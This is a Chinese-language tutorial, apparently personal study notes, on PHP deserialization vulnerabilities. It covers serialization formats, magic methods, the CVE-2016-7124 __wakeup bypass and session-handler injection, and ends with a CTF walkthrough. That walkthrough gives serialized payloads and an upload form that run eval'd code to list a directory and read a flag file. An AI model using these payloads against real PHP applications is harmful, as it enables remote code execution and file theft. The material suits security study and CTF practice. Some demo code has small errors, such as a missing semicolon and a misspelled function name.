---
typora-copy-images-to: ../images
typora-root-url: ..
---



# PHP反序列化漏洞

### PHP序列化

PHP使用serialize()函数来进行序列化

函数原型：

```php
serialize ( mixed $value ) : string
```

serialize()函数返回一个字符串，这个字符串包含了表示value的字节流，可以存储与任何地方，通常会存储在一个文本文件中。

序列化有利于存储或者传递PHP的值，同时不会丢失其类型和结构。



**序列化对象**

PHP中的对象可以被序列化，如果对象存在魔法函数`__sleep()`，那么在序列化前会调用魔法函数`__sleep()`，`__sleep()`函数必须返回一个数组，数组的内容是要进行序列化的属性。

demo1:

```php
<?php
class test{
    public $var = 0;
    public $name = 'default';
    
    public static function print_me(){
        echo "<p>".$this->name."</p>";
        echo "</br>";
    }
    public function __sleep(){
        return array('var','name');
    }
}

$var = new test()
$var->name = 'admin';

$s = serialize($var);
echo "<p>".$s."</p>";

?>
```

输出结果：

>  O:4:"test":2:{s:3:"var";i:1;s:4:"name";s:5:"admin";} 

对象序列化结果的格式：

> O:4:"test":2:{s:3:"var";i:1;s:4:"name";s:5:"admin";} 
>
> 对象类型:长度:对象名:类中变量的个数:{类型:长度:值:类型:长度:值.....}

对象类型的缩写集合：

```
a - array                  b - boolean  
d - double                 i - integer
o - common object          r - reference
s - string                 C - custom object
O - class                  N - null
R - pointer reference      U - unicode string
```



上面demo中的类的属性仅有publics属性，而php中类的属性的权限一共有三种：public(公有的)、protected(受保护的)、private(私有的)。

三者的区别： 被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问 。



demo2:

```php
<?php
highlight_file(__FILE__);

class test{
    public $var = 0;
    public $name = 'default';
    protected $age = 20;
	private $password = '123456';

    public function print_me(){
        echo "<p>".$this->name."</p>";
        echo "</br>";
    }

}

$a = new test();
$a->var = 1;
$a->name = 'admin';

$b = serialize($a);
echo "<p>".$b."</p>";

?>

```



输出结果：

![image-20200529154603504](/images/image-20200529154603504.png)

可以发现potected属性名称前会加一个`*`，它的属性名长度为6，是因为protect属性序列化的时候格式是%00*%00成员名，%00占一个字节，所以长度为6 。private属性序列化的时候格式是%00类名%00成员名，所以长度为14 。



常见类型的序列化：

demo3:

```php
<?php

$str ="strings";
$int = 1;
$dou = 0.1;
$boole = True;
$null = NULl;
$arr = array('1','2');

echo serialize($int);
echo "</br>";
echo serialize($str);
echo "</br>";
echo serialize($dou);
echo "</br>";
echo serialize($boole);
echo "</br>";
echo serialize($null);
echo "</br>";
echo serialize($arr);
echo "</br>";
?>
```

输出结果：

>  i:1;
>  s:7:"strings";
>  d:0.10000000000000001;
>  b:1;
>  N;
>  a:2:{i:0;s:1:"1";i:1;s:1:"2";} 



### PHP反序列化

PHP反序列化使用 **unserialize()** 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 

函数原型：

```php
unserialize ( string $str ) : mixed
```

如果反序列化后的对象存在`__wakeup()`方法，那么在反序列化成功后，php会自动的去调用`__wakeup()`方法。



### PHP魔术方法

PHP将所有以两个下划线为开头的类方法保留为魔术方法。

常见的魔术方法：

* __sleep()
* __wakeup()
* __construct()
* __destruct()
* __call()
* __callStatic()
* __toString()
* __invoke()
* __get()
* __set()
* __isset()
* __unset()



**__sleep()**

__sleep()方法在对象被序列化前调用，会返回一个数组，其中包含者要被序列化的属性。它通常用于提交未提交的数据或者类似的清理操作。

函数原型：

```php
public __sleep ( void ) : array
```



**__wakeup()**

unserialize()函数会检查反序列化的对象是否存在一个__wakeup()方法，如果存在，反序列化成功后会自动的去调用这个方法。这个方法通常用于初始化操作，如重新建立数据库链接。

函数原型：

```php
__wakeup ( void ) : void
```



**__construct()**

__construct()方法是类的构造函数，每次创建新对象时都会调用这个方法。

函数原型：

```php
__construct ([ mixed $args [, $... ]] ) : void
```



**__destruct()**

__destruct()方法是类的析构函数，析构函数会在某个对象的所有引用被删除或者当对象被显示销毁时执行，通常是脚本结束时执行。

函数原型：

```php
__destruct ( void ) : void
```



**__call()**

当对象调用了一个不可访问的方法时，__call()就会被调用。

函数原型：

```php
public __call ( string $name , array $arguments ) : mixed
```

其中$name是要调用的方法的名称，$arguments是要传给调用方法的参数



**__callStatic()**

 从PHP5.3开始出现此方法, 当在静态上下文中调用一个不可访问方法时，__callStatic()方法会被调用。

函数原型：

```php
public static __callStatic ( string $name , array $arguments ) : mixed
```



**__toString()**

当对象被echo输出时，会调用__toString()方法。这个方法必须返回一个字符串。



**__invoke()**

当尝试以调用函数的方式来调用一个对象时，__invoke()方法会被调用。

函数原型：

```php
__invoke ([ $... ] ) : mixed
```



**__get()**

当读取不可访问属性时，__get()会被调用

函数原型：

```php
public __get ( string $name ) : mixed
```



**__set()**

当给不可访问属性赋值时，__set()方法会被调用

函数原型：

```php
public __set ( string $name , mixed $value ) : void
```



**__isset()**

当对不可访问属性调用isset()或empty()时，__isset()会被调用。

函数原型：

```php
public __isset ( string $name ) : bool
```



**__unset()**

当对不可访问属性调用unset()时，__unset()函数会被调用。

函数原型：

```php
public __unset ( string $name ) : void
```



### PHP反序列化漏洞

开发者在写程序时没有控制好传递给unserialize()函数的变量，导致用户可以控制反序列化的内容，攻击者可以提交特定的序列化字符串给unserialize()函数，可以实现PHP对象注入，最终可能会导致任意代码执行等问题。

例如:

```php
<?php

class test{
	public $var;
	function __construct(){
		echo 'hello';
	}
	function __destruct(){
		eval($this->var);
	}
}


$a = new test();
unserialize($_GET['a']);
```

类test中有一个`__construct()`构造函数和一个`__destruct()`析构函数。构造函数输出一个字符串，析构函数将属性var传给eval执行。

构造代码：

```php
<?php

class test{
	public $var='phpinfo();';

}

$a = new test();
echo serialize($a);
```

得到序列化字符串：

> O:4:"test":1:{s:3:"var";s:10:"phpinfo();";}

![image-20200530154450443](/images/image-20200530154450443.png)



#### __wakeup()方法绕过

PHP反序列化漏洞CVE-2016-7124

> 当反序列化字符串时，如果表示属性个数的值大于真实属性个数时，就会绕过__wakeup函数的执行

适用版本：

PHP5<5.6.25

PHP7<7.0.10



demo

```php
<?php

class test{
	public $var;
	function __construct($a){
		$this->var = $a;
	}
	function __wakeup(){
		if(!isset($this->var)){
			$this->var = 'hello';
		}else{
			$this->var = 'hello';
		}
	}
	function __destruct(){
		echo "var is ".$this->var."\n"; 
	}
}
$b = unserialize($_GET['a']);
```

上面的代码`__wakeup()`会将var初始化为'hello'，但是当传入序列化字符串中的属性个数比实际大时就会绕过`__wakeup()`方法。

构造序列化字符串：

> O:4:"test":2:{s:3:"var";s:3:"pwn";}

![image-20200530162155281](/images/image-20200530162155281.png)

`__wakeup()`方法就被绕过了，var的值被设为了'pwn'.



#### Session反序列化漏洞

前置知识：

**序列化处理器**

PHP序列化处理一共有三种：php_serialize、php_binary和php(需要编译时开启支持)

它们三者的存储格式分别为：

php_serialize：serialize()函数序列化处理的数组

php_binary：键名的长度对应的ascii字符+键名+经过serialize()序列化处理的值

php：键名 + 竖线+ 经过serialize()函数序列化处理的值

例如：

```php
$_SESSION['user'] = $_GET['a'];
```

假设传进去的字符串为"admin"，那么经过三者序列化处理的字符串分别为：

php_serialize : a:1{s:4:"user";s:5:"admin";}

php_binary : (4所对应的ascii码)+user:5:"admin"

php : user|s:5:"admin"



**Session的基本原理**

Session是存储在服务端的会话，对比cookie来说，相对安全，而且不像cookie那样有存储长度限制。当浏览器第一次发送请求时，服务器会自动生成一个Session和一个Session ID用来唯一表示这个Session，并且将它通过相应发送给服务器。浏览器第二次发送请求时，会将之前获得的Session ID放在请求中一起发给服务器，然后服务器从请求中提取Session ID，将这个ID和保存的Session ID对比，找到对应的Session。

通常session存储的文件名为sess_ + PHPSESSID。



**Session序列化机制**

当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。 



**php.ini配置**

php.ini中有一些关于session的配置，我们需要知道的有这几个

```
session.save_path="" --设置session的存储路径
session.save_handler=""--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start boolen--指定会话模块是否在请求开始时启动一个会话默认为0不启动
session.serialize_handler string--定义用来序列化/反序列化的处理器名字。默认使用php
```



**漏洞原理**

Session反序列化漏洞原理挺简单的，就是处理Session序列化和Session反序列化的引擎不同，利用引擎之间的差异产生了序列化注入漏洞。

例子：

session1.php

```php
<?php
ini_set("session_serialize_handler","php_serialize");
session_start();
$_SESSION['a']=$_GET['a'];
```

session2.php

```php
<?php
ini_set("session_serialize_handler","php");
session_start();

class test{
    public $strings="hello";
    function __wakeup(){
        echo "strings is ".$this->strings;
    }
}
```

首先通过访问session1.php写入session，因为session1.php使用的引擎是php_serialize()，所以存储格式为serialize()函数处理的格式，传入一个`|`会被当作普通字符。但是当访问session2.php时，使用的引擎是php，它会将`|`当作键名与值得分隔符，从而产生歧义，导致在解析session文件时对`|`后的值做了反序列化处理。

攻击payload生成:

```php
<?php
class test{
    public $stings="pwn";
}
echo serialize(new test());
```

输出：

>  O:4:"test":1:{s:6:"stings";s:3:"pwn";} 

最终payload:

> |O:4:"test":1:{s:6:"stings";s:3:"pwn";} 

访问session1.php，可以发现payload被写入session文件里了

![image-20200531190020147](/images/image-20200531190020147.png)

这时访问session2.php，那么php引擎就会将`|`后的当作序列化字符串进行反序列化，页面上就会输出"strings is pwn"。



**利用 upload_process 机制**

如果不能直接控制SESSION值时，可以通过 upload_process 机制来往$_SESSION中写入值。

> 当 session.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。
>
> 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。

jarvisoj上有道这样的题目：PHPINFO

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

可以发现它一开始就通过ini_set设置使用php引擎，当GET传入一个phpinfo变量时，就会new一个OowoO对象，OowoO对象中的`__construct()`会初始化mdzz属性为"phpinfo();"，而它的`__destruct()`会执行eval($this->mdzz)，将phpinfo信息打印出来。

![image-20200531193728586](/images/image-20200531193728586.png)

通过phpinfo的信息可以知道它处理session的引擎不一致

> local: php
>
> master: php_serialize

其中local指的是当前目录中，它会将master的内容， 而master指的是php.ini设置的session.serialize_handler。所以很明显这里存在session反序列化漏洞。

接下来就是如何往session中写入内容。

通过phpinfo的信息可以发现它session_upload_progress_enabled是开启的，同时session_upload_progress_cleanup是关闭的，这允许我们在一个文件上传的时候，通过POST请求一个与INI中设置的session.upload_progress.name同名变量，来往session中写入内容，并且它的值能被保存下来。

构建一个文件上传的html：

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

因为它disable_function经用了一堆调用系统命令的函数， 所以只能用php自带函数来读取目录和文件内容 。

![image-20200531203023847](/images/image-20200531203023847.png)

构建poc

```php
class OowoO{
    public $mdzz="print_r(scandir(dirname(__FILE__)));";

}
$a = new OowoO();
echo serialize($a);
```

输出 ：

```
O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}
```

最终payload:

```php
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
```

抓包，其中 http报文中的filename的值对应

`$_SESSION['upload_progress_laruence']['files'][0]['name']`
http报文中的name的值对应
`$_SESSION['upload_progress_laruence']['files'][0]['filed_name'] ` 

这两处都可以攻击，这里选择将filename修改为payload

![image-20200531201731257](/images/image-20200531201731257.png)

可以返回的文件名中包含有Here_1s_7he_fl4g_buT_You_Cannot_see.php

flag就在这个文件里，通过phpinfo可以得到文件的绝对路径，然后就可以利用file_get_content函数读取flag出来。

![image-20200531202327222](/images/image-20200531202327222.png)

路径：/opt/lamp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php

替换payload里的`print_r(scandir(dirname(__FILE__)));`为`print_r(file_get_content(\"/opt/lamp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"))`来读取flag

payload:

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}
```



![image-20200531202857396](/images/image-20200531202857396.png)





### REFERENCE

*  https://xz.aliyun.com/t/7366#toc-3 
*  https://xz.aliyun.com/t/3674#toc-13 
*  https://xz.aliyun.com/t/7570#toc-11 
*  https://websec.readthedocs.io/zh/latest/language/php/unserialize.html 